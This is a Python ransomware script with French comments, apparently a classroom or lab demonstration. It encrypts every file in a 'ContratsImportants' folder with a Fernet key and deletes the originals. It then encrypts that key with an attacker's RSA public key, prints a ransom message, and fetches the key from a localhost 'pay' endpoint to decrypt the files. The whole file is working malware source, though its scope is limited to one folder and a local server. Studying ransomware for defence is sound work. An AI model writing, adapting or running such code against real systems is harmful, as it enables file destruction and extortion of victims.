#!/usr/bin/env python3
import os
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Fichiers de configuration et URL de l'attaquant
PUBLIC_KEY_FILE = "attacker_public.pem"
SYMMETRIC_KEY_ENC_FILE = "symmetric_key.enc"
ATTACKER_URL = "http://localhost:5001/pay"

def load_public_key():
    """Charge la clé publique de l'attaquant depuis le fichier."""
    with open(PUBLIC_KEY_FILE, "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())
    return public_key

def encrypt_files(symmetric_key):
    """Chiffre tous les fichiers du dossier 'ContratsImportants' avec la clé symétrique."""
    fernet = Fernet(symmetric_key)
    dossier = "ContratsImportants"
    if not os.path.exists(dossier):
        print(f"Le dossier '{dossier}' n'existe pas. Veuillez le créer et y ajouter des fichiers.")
        return

    for filename in os.listdir(dossier):
        chemin = os.path.join(dossier, filename)
        if os.path.isfile(chemin):
            with open(chemin, "rb") as file:
                data = file.read()
            encrypted_data = fernet.encrypt(data)
            # Sauvegarde avec extension .enc et suppression de l'original
            with open(chemin + ".enc", "wb") as file:
                file.write(encrypted_data)
            os.remove(chemin)
            print(f"Fichier '{filename}' chiffré.")

def decrypt_files(symmetric_key):
    """Déchiffre tous les fichiers chiffrés dans le dossier 'ContratsImportants' avec la clé symétrique."""
    fernet = Fernet(symmetric_key)
    dossier = "ContratsImportants"
    for filename in os.listdir(dossier):
        if filename.endswith(".enc"):
            chemin = os.path.join(dossier, filename)
            with open(chemin, "rb") as file:
                encrypted_data = file.read()
            try:
                data = fernet.decrypt(encrypted_data)
                # Restauration du nom original en retirant l'extension .enc
                original_file = chemin[:-4]
                with open(original_file, "wb") as file:
                    file.write(data)
                os.remove(chemin)
                print(f"Fichier '{filename}' déchiffré.")
            except Exception as e:
                print(f"Erreur lors du déchiffrement de '{filename}': {e}")

def victim_flow():
    # 1. Génération de la clé symétrique pour le chiffrement des fichiers
    symmetric_key = Fernet.generate_key()
    print("[*] Clé symétrique générée.")

    # 2. Chiffrement des fichiers dans le dossier 'ContratsImportants'
    encrypt_files(symmetric_key)
    print("[*] Les fichiers du dossier 'ContratsImportants' ont été chiffrés.")

    # 3. Chiffrement de la clé symétrique avec la clé publique de l'attaquant
    public_key = load_public_key()
    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(SYMMETRIC_KEY_ENC_FILE, "wb") as f:
        f.write(encrypted_symmetric_key)
    print("[*] Clé symétrique chiffrée et sauvegardée dans 'symmetric_key.enc'.")

    # 4. Affichage du message de rançon dans la console
    print("\n********** RANSOMWARE ACTIVÉ **********")
    print("Vos fichiers ont été chiffrés !")
    print("Pour récupérer vos fichiers, tapez 'payer' et appuyez sur Entrée.")
    print("****************************************\n")

    # 5. Attente de la décision de l'utilisateur
    user_input = input("Entrez 'payer' pour payer la rançon et récupérer vos fichiers : ")
    if user_input.strip().lower() == "payer":
        try:
            response = requests.post(ATTACKER_URL)
            if response.status_code == 200:
                data = response.json()
                sym_key_str = data.get("symmetric_key")
                if sym_key_str:
                    # Reconversion de la clé symétrique en bytes
                    sym_key = sym_key_str.encode()
                    decrypt_files(sym_key)
                    print("Vos fichiers ont été déchiffrés avec succès.")
                else:
                    print("Erreur : Clé symétrique non reçue du serveur.")
            else:
                print(f"Erreur serveur: {response.text}")
        except Exception as e:
            print("Erreur lors de la connexion au serveur :", e)
    else:
        print("Aucun paiement n'a été effectué. Vos fichiers restent chiffrés.")

if __name__ == "__main__":
    victim_flow()

